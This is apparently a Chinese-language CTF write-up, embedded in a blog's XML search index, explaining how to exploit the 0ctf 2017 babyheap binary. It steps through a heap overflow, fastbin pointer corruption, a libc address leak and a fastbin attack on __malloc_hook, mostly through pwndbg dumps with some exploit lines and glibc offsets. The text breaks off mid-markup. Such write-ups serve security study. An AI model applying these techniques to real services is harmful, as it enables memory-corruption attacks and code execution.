<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0ctf_2017_babyheap详解</title>
    <url>/2021/04/19/23-55/</url>
    <content><![CDATA[<blockquote>
<p>本文主要列出0ctf_2017_babyheap的详细过程</p>
<p>主要参考：<a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223461.htm</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li>allocate：申请size大小的块</li>
<li>fill：对idx的块，设置size，并填入content</li>
<li>free：释放idx的块</li>
<li>dump：打印idx的块内容</li>
</ol>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>fill中的size可以重新设置，故可以造成堆溢出。</p>
<p>方法：fastbin attack</p>
<ol>
<li><p>double free泄露libc</p>
<p>【small/large chunk释放，fd和bk指向main_arena】</p>
</li>
<li><p>fastbin attack写malloc_hook为one_gadget</p>
</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-保护"><a href="#1-保护" class="headerlink" title="1.保护"></a>1.保护</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec 0ctf_2017_babyheap </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;0ctf_2017_babyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<h4 id="2-申请初始块"><a href="#2-申请初始块" class="headerlink" title="2.申请初始块"></a>2.申请初始块</h4><blockquote>
<p>四个0x10、一个0x80</p>
<p>第0个块作用：方便修改第1、2块</p>
<p>第3个块作用：方便修改0x80的块</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x5614ee1f6120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="3-释放1、2块"><a href="#3-释放1、2块" class="headerlink" title="3.释放1、2块"></a>3.释放1、2块</h4><blockquote>
<p>为double free做准备，其中 块2指向块1</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#1</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">#指向块1，先进后出</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x5614ee1f6020</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6020	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x5614ee1f6120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="4-令释放块2指向块4"><a href="#4-令释放块2指向块4" class="headerlink" title="4.令释放块2指向块4"></a>4.令释放块2指向块4</h4><blockquote>
<p>通过漏洞fill堆溢出，修改块2里指向块1的低地址，修改为0x80，即可使得块2指向块4</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6080	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<h4 id="5-为绕过检测，修改块4：0x80-gt-0x10"><a href="#5-为绕过检测，修改块4：0x80-gt-0x10" class="headerlink" title="5.为绕过检测，修改块4：0x80-&gt;0x10"></a>5.为绕过检测，修改块4：0x80-&gt;0x10</h4><blockquote>
<p>溢出实现</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x00005614ee1f6080	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<blockquote>
<p>修改成功，但是由于chunk4的大小修改了，故找不到top chunk了，故后期需要把大小：0x10-&gt;0x80</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x5614ee1f6080</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<blockquote>
<p>通过溢出，成功修改了chunk2指向chunk4，导致未释放的chunk4加入到了bin中，重新allocate，导致idx=2、4都为同一个块。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x555923ab8040 —▸ 0x555923ab8080 ◂— 0x21 &#x2F;* &#39;!&#39; *&#x2F;</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<h4 id="6-重新申请回两个块"><a href="#6-重新申请回两个块" class="headerlink" title="6.重新申请回两个块"></a>6.重新申请回两个块</h4><blockquote>
<p>1、2、4</p>
<p>释放：块1-&gt;块2</p>
<p>修改：块2-&gt;块4</p>
<p>重新申请：块4-&gt;块2（idx1-&gt;idx2）</p>
<p>故</p>
<ul>
<li>原块1直接释放态-&gt;allocate态</li>
<li>原块2-&gt;idx1</li>
<li>原块4-&gt;idx2</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#先进后出</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f60a0</span><br><span class="line">Size: 0x00</span><br></pre></td></tr></table></figure>
<h4 id="7-重新修改chunk4：0x10-gt-0x80"><a href="#7-重新修改chunk4：0x10-gt-0x80" class="headerlink" title="7.重新修改chunk4：0x10-&gt;0x80"></a>7.重新修改chunk4：0x10-&gt;0x80</h4><blockquote>
<p>为了让top chunk重新找得到，故需要重新讲chunk4的大小修改回0x80，以便于之后申请操作。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">#0</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line">#1</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line">#new 1</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line">#3</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line">#2、4</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>
<h4 id="8-申请一个块，防止块4free与top-chunk合并"><a href="#8-申请一个块，防止块4free与top-chunk合并" class="headerlink" title="8.申请一个块，防止块4free与top chunk合并"></a>8.申请一个块，防止块4free与top chunk合并</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">#alloc(0x80)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
<h4 id="9-释放chunk4"><a href="#9-释放chunk4" class="headerlink" title="9.释放chunk4"></a>9.释放chunk4</h4><blockquote>
<p>因为此时idx2、4都指向chunk4，故可以释放chunk4，此时它里面会填入main_arena中地址，可以计算得到libc_base</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#free(4)</span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
<h4 id="10-打印idx2-即idx4内容"><a href="#10-打印idx2-即idx4内容" class="headerlink" title="10.打印idx2(即idx4内容)"></a>10.打印idx2(即idx4内容)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libc_base &#x3D; u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br></pre></td></tr></table></figure>
<h4 id="11-申请0x60的块"><a href="#11-申请0x60的块" class="headerlink" title="11.申请0x60的块"></a>11.申请0x60的块</h4><blockquote>
<p>新块的idx为4（把idx4给了分配的块，为分配的0x21没有idx）</p>
<p>切割0x91的块，剩下0x21放入了unsortedbin中</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#alloc(0x60)</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
<h4 id="12-释放0x60的块"><a href="#12-释放0x60的块" class="headerlink" title="12.释放0x60的块"></a>12.释放0x60的块</h4><blockquote>
<p>再次释放0x60的块，放入了fastbin中，为fastbin后面继续申请0x60的堆地址提供了帮助，，，</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">#free(4)</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br></pre></td></tr></table></figure>
<h4 id="13-修改idx2的内容，为malloc-hook附近构造chunk的地址"><a href="#13-修改idx2的内容，为malloc-hook附近构造chunk的地址" class="headerlink" title="13.修改idx2的内容，为malloc_hook附近构造chunk的地址"></a>13.修改idx2的内容，为malloc_hook附近构造chunk的地址</h4><blockquote>
<p>需要改地址，有fastbin大小的八字节数字，，，</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#payload &#x3D; p64(libc_base+0x3c4aed)</span><br><span class="line">#fill(2, payload)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x5614ee1f6090:	0x00007f6a86e67aed	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x7f6a86e67aed#修改后的地址</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f60f0</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7f6a86e67b78</span><br><span class="line">bk: 0x7f6a86e67b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f61a0</span><br><span class="line">Size: 0x20e61</span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">#接下来申请两遍，即可得到0x7f6a86e67aed地址的块，可以对0x7f6a86e67aed进行数据读写</span><br><span class="line">0x70: 0x5614ee1f6080 —▸ 0x7f6a86e67aed (_IO_wide_data_0+301) ◂— 0x6a86b28ea0000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5614ee1f60f0 —▸ 0x7f6a86e67b78 (main_arena+88) ◂— 0x5614ee1f60f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span 